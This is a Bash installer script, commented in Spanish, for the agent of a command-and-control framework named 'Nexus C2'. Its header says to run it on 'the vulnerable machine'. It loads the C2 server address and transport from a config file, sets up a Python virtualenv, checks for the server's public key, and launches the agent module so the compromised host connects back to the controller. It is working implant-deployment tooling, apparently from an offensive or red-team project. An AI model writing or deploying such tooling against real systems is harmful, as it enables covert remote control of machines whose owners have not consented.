#!/bin/bash
# Script de instalación del agente Nexus C2.
# Corre este script en la máquina vulnerable.
#
# Uso:
#   chmod +x install.sh
#   ./install.sh

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

echo "============================================"
echo "  Nexus C2 — Instalación del Agente"
echo "============================================"
echo ""

# ── Leer configuración ────────────────────────────────────────────────────────
if [ ! -f "$SCRIPT_DIR/config.env" ]; then
    echo "[!] ERROR: config.env no encontrado."
    echo "    Usa build_package.sh en el servidor para generar el paquete correctamente."
    exit 1
fi
source "$SCRIPT_DIR/config.env"
echo "[+] Servidor C2 : $NEXUS_SERVER"
echo "[+] Transporte  : $NEXUS_TRANSPORT"
echo ""

# ── Verificar Python 3 ────────────────────────────────────────────────────────
if ! command -v python3 &>/dev/null; then
    echo "[!] ERROR: Python 3 no encontrado."
    echo "    En Raspberry Pi / Debian:  sudo apt-get install -y python3 python3-venv"
    exit 1
fi
echo "[+] Python: $(python3 --version)"

# ── Entorno virtual ───────────────────────────────────────────────────────────
VENV="$SCRIPT_DIR/.venv"
if [ ! -d "$VENV" ]; then
    echo "[*] Creando entorno virtual..."
    python3 -m venv "$VENV"
fi

# ── Instalar dependencias ─────────────────────────────────────────────────────
echo "[*] Instalando dependencias..."
"$VENV/bin/pip" install --upgrade pip -q
"$VENV/bin/pip" install -r "$SCRIPT_DIR/requirements.txt" -q
echo "[+] Dependencias instaladas"
echo ""

# ── Verificar clave pública del servidor ──────────────────────────────────────
if [ ! -f "$SCRIPT_DIR/server_pub.hex" ]; then
    echo "[!] ERROR: server_pub.hex no encontrado."
    echo "    Copia el archivo desde el servidor C2 y vuelve a intentarlo."
    exit 1
fi
echo "[+] Clave del servidor : $(head -c 16 "$SCRIPT_DIR/server_pub.hex")..."
echo ""

# ── Lanzar agente ─────────────────────────────────────────────────────────────
export NEXUS_SERVER="$NEXUS_SERVER"
export NEXUS_TRANSPORT="$NEXUS_TRANSPORT"
export NEXUS_SERVER_PUB="$(cat "$SCRIPT_DIR/server_pub.hex")"

echo "============================================"
echo "  Agente iniciando — Ctrl+C para detener"
echo "============================================"
echo ""

cd "$SCRIPT_DIR"
exec "$VENV/bin/python" -m agent
